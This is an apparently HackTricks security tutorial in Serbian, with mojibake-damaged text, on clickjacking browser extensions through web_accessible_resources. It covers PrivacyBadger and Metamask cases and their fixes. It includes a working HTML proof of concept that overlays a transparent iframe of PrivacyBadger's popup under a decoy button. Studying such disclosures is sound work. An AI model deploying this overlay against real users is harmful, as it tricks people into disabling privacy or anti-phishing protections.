# BrowExt - ClickJacking

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Ova stranica Ä‡e zloupotrebiti ranjivost ClickJacking u Browser ekstenziji.\
Ako ne znate Å¡ta je ClickJacking, proverite:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Ekstenzije sadrÅ¾e datoteku **`manifest.json`** i ta JSON datoteka ima polje `web_accessible_resources`. Evo Å¡ta [Chrome dokumentacija](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) kaÅ¾e o tome:

> Ovi resursi biÄ‡e dostupni na veb stranici putem URL-a **`chrome-extension://[PACKAGE ID]/[PATH]`**, koji se moÅ¾e generisati pomoÄ‡u **`extension.getURL metode`**. Resursi na dozvoljenoj listi se serviraju sa odgovarajuÄ‡im CORS zaglavljima, tako da su dostupni putem mehanizama poput XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** u browser ekstenziji nisu samo dostupni putem veba; takoÄ‘e funkcioniÅ¡u sa inherentnim privilegijama ekstenzije. To znaÄi da imaju moguÄ‡nost da:

* Promene stanje ekstenzije
* UÄitaju dodatne resurse
* Interaguju sa pregledaÄem do odreÄ‘ene mere

MeÄ‘utim, ova funkcija predstavlja sigurnosni rizik. Ako resurs unutar **`web_accessible_resources`** ima znaÄajnu funkcionalnost, napadaÄ bi potencijalno mogao da ugradi ovaj resurs u spoljnu veb stranicu. Nesumnjivi korisnici koji posete ovu stranicu moÅ¾da nehotice aktiviraju ovaj ugraÄ‘eni resurs. Takva aktivacija moÅ¾e dovesti do neÅ¾eljenih posledica, zavisno od dozvola i sposobnosti resursa ekstenzije.

## Primer PrivacyBadger-a

U ekstenziji PrivacyBadger, identifikovana je ranjivost koja se odnosi na `skin/` direktorijum koji je deklarisan kao `web_accessible_resources` na sledeÄ‡i naÄin (Proverite originalni [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ova konfiguracija dovela je do potencijalnog sigurnosnog problema. Konkretno, fajl `skin/popup.html`, koji se prikazuje prilikom interakcije sa ikonom PrivacyBadger-a u pregledaÄu, mogao bi biti ugraÄ‘en unutar `iframe`-a. Ovo ugraÄ‘ivanje moglo bi biti iskoriÅ¡Ä‡eno da bi se korisnici prevarili da nenamerno kliknu na "OnemoguÄ‡i PrivacyBadger za ovaj sajt". Takva akcija bi ugrozila privatnost korisnika onemoguÄ‡avanjem zaÅ¡tite PrivacyBadger-a i potencijalno izloÅ¾ila korisnika poveÄ‡anom praÄ‡enju. Vizuelna demonstracija ovog eksploata moÅ¾e se pogledati u primeru video zapisa ClickJacking-a koji je dostupan na [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Da bi se reÅ¡ila ova ranjivost, implementirano je jednostavno reÅ¡enje: uklanjanje `/skin/*` sa liste `web_accessible_resources`. Ova promena efikasno umanjuje rizik osiguravajuÄ‡i da sadrÅ¾aj direktorijuma `skin/` ne moÅ¾e biti pristupljen ili manipulisan putem web-pristupaÄnih resursa.

Popravka je bila jednostavna: **ukloniti `/skin/*` iz `web_accessible_resources` liste**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Primer sa Metamaskom

[**Blog post o ClickJacking-u u Metamasku moÅ¾ete pronaÄ‡i ovde**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). U ovom sluÄaju, Metamask je popravio ranjivost proverom da li je koriÅ¡Ä‡eni protokol za pristup bio **`https:`** ili **`http:`** (a ne **`chrome:`** na primer):

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

**JoÅ¡ jedan popravljen ClickJacking** u Metamask ekstenziji bio je taj Å¡to su korisnici mogli **kliknuti da dodaju na belu listu** kada je stranica bila sumnjiva da je fising zbog `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]`. PoÅ¡to je ta stranica bila ranjiva na Clickjacking, napadaÄ bi mogao da je zloupotrebi prikazujuÄ‡i neÅ¡to normalno kako bi Å¾rtva kliknula da je doda na belu listu ne primeÄ‡ujuÄ‡i, a zatim se vratila na stranicu za ribarenje koja Ä‡e biti dodata na belu listu.

## Primer sa Steam Inventory Helperom

Proverite sledeÄ‡u stranicu da vidite kako je **XSS** u browser ekstenziji povezan sa **ClickJacking** ranjivoÅ¡Ä‡u:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Reference

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
